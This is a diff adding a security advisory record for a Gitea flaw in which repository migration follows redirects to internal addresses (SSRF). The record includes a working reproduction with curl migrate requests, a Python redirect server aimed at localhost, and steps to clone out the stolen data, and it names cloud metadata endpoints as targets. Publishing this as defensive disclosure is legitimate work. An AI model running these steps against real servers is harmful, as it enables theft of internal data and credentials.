@@ -1,0 +1,66 @@
+{
+  "id": "GHSA-rqhx-647v-wx32",
+  "modified": "2026-07-21T20:45:36.424900081Z",
+  "published": "2026-07-21T20:33:52Z",
+  "aliases": [
+    "CVE-2026-58418"
+  ],
+  "summary": "Gitea: SSRF via HTTP Redirect in Repository Migration",
+  "details": "## Summary\n\nGitea 1.25.4 validates the initial URL provided to the repository migration endpoint (`POST /api/v1/repos/migrate`) and correctly blocks requests to internal addresses like `127.0.0.1` or RFC1918 ranges. However, if the initial URL points to an attacker-controlled server that responds with an HTTP 302 redirect to an internal address, Gitea follows the redirect without performing a second validation. This allows a low-privilege user to reach internal services through Gitea as a proxy.\n\n## Affected Version\n\nGitea 1.25.4 (latest stable at time of writing), default configuration.\n\n## Prerequisites\n\n1. A regular Gitea user account (no admin privileges required)\n2. An attacker-controlled server reachable from the internet that serves HTTP 302 redirects\n\n## Reproduction\n\n### Environment\n\n| Role             | Location                                                       | Network                                  |\n|------------------|----------------------------------------------------------------|------------------------------------------|\n| Attacker         | Any machine with internet access                               | External network (VLAN A)                |\n| Gitea Server     | Windows 11 VM, Gitea 1.25.4, default config, SQLite           | Internal network (VLAN B)                |\n| Internal service | Same VM, bound to `127.0.0.1:18082`                           | Localhost only                           |\n| Redirect server  | Attacker-controlled public server, port 18080                 | Internet                                 |\n\nThe attacker can reach Gitea on port 3000 but cannot reach port 18082 on the VM. This was verified by attempting a direct connection, which was refused.\n\n### Step 1: Create an attacker account on Gitea\n\nRegister a normal user account on the Gitea instance (or use any existing non-admin account). Then generate an API token under **Settings \u003e Applications** with the `repo: write` scope. The migration endpoint requires this because it creates a new repository. This token is referenced as `\u003cUSER_TOKEN\u003e` in the steps below.\n\n### Step 2: Set up an internal service on the Gitea host\n\nOn the Gitea VM, create a bare Git repository that simulates an internal service:\n\n```bash\nmkdir C:\\internal-repo\ncd C:\\internal-repo\ngit init\necho CONFIDENTIAL_DATA_2025 \u003e secret.txt\ngit add .\ngit commit -m \"internal confidential\"\ngit clone --bare . C:\\internal.git\ncd C:\\internal.git\ngit update-server-info\npython -m http.server 18082 --bind 127.0.0.1\n```\n\nThis serves a Git repository on localhost port 18082. It is not reachable from outside the machine.\n\n### Step 3: Confirm Gitea blocks direct access to internal addresses\n\nFrom the attacker machine:\n\n```bash\ncurl -X POST http://\u003cGITEA_SERVER\u003e:3000/api/v1/repos/migrate \\\n  -H \"Authorization: token \u003cUSER_TOKEN\u003e\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"clone_addr\": \"http://127.0.0.1:18082/\",\n    \"repo_name\": \"direct-test\",\n    \"service\": \"git\"\n  }'\n```\n\nResponse:\n\n```json\n{\"message\":\"You can not import from disallowed hosts.\"}\n```\n\nThis confirms that Gitea correctly blocks migration from internal addresses when provided directly.\n\n### Step 4: Set up a redirect server\n\nOn an attacker-controlled public server, run a script that redirects all requests to the internal service:\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        path = self.path\n        if path.startswith(\"/repo.git\"):\n            path = path[len(\"/repo.git\"):]\n        target = f\"http://127.0.0.1:18082{path}\"\n        self.send_response(302)\n        self.send_header(\"Location\", target)\n        self.end_headers()\n        print(f\"[+] Redirected {self.path} -\u003e {target}\")\n\n    do_HEAD = do_GET\n\nHTTPServer((\"0.0.0.0\", 18080), RedirectHandler).serve_forever()\n```\n\n### Step 5: Exploit the redirect bypass\n\nFrom the attacker machine:\n\n```bash\ncurl -X POST http://\u003cGITEA_SERVER\u003e:3000/api/v1/repos/migrate \\\n  -H \"Authorization: token \u003cUSER_TOKEN\u003e\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"clone_addr\": \"http://\u003cATTACKER_SERVER\u003e:18080/repo.git\",\n    \"repo_name\": \"exfil-test\",\n    \"service\": \"git\",\n    \"private\": true\n  }'\n```\n\nResponse: **HTTP 201 Created**. The migration succeeds.\n\n### Step 6: Retrieve the exfiltrated data\n\nFrom the attacker machine:\n\n```bash\ngit clone http://attacker:password@\u003cGITEA_SERVER\u003e:3000/attacker/exfil-test.git\ncat exfil-test/secret.txt\n```\n\nOutput:\n\n```text\nCONFIDENTIAL_DATA_2025\n```\n\nThe attacker now has the contents of the internal repository that was only accessible on localhost.\n\n## What happens during the attack\n\n1. The attacker sends a migration request pointing to their public server.\n2. Gitea validates the URL. The destination is a public IP, so it passes the check.\n3. Gitea contacts the attacker's server to clone the repository.\n4. The attacker's server responds with `302 Location: http://127.0.0.1:18082/...`\n5. Gitea follows the redirect to `127.0.0.1` without validating the new destination.\n6. The internal service responds and Gitea stores the result as a new repository owned by the attacker.\n7. The attacker clones their newly created repository and reads the internal data.\n\n## Impact\n\nAny authenticated user with permission to create repositories can use the migration feature to reach services that are only accessible from the Gitea server itself or its local network. Depending on the environment this could include:\n\n1. Internal Git repositories or other version control systems not exposed to the internet\n2. Cloud metadata endpoints (`169.254.169.254`) which serve temporary credentials on AWS, GCP, and Azure\n3. Internal APIs, CI/CD systems, databases, or admin panels bound to localhost or private networks\n4. Other services within the same network segment that trust connections from the Gitea server\n\nThe full content of internal Git repositories can be exfiltrated as demonstrated above. For non-Git services, the request still reaches the target (blind SSRF), which may be enough to trigger actions or leak information through error messages.\n\n## Suggested Fix\n\nValidate the destination of HTTP redirects against the same blocklist that is applied to the initial URL. If a redirect points to a blocked address (loopback, link-local, RFC1918), the request should be aborted before following the redirect.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.gitea.io/gitea",
+        "purl": "pkg:golang/code.gitea.io/gitea"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.26.4"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c 1.26.3",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-rqhx-647v-wx32/GHSA-rqhx-647v-wx32.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/security/advisories/GHSA-rqhx-647v-wx32"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-58418"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/pull/38108"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/commit/9e84deb969aff5c1115c2984e41250f28c78451f"
+    },
+    {
+      "type": "WEB",
+      "url": "https://blog.gitea.com/release-of-1.26.3-and-1.26.4"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-gitea/gitea"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/releases/tag/v1.26.4"
+    }
+  ]
+}
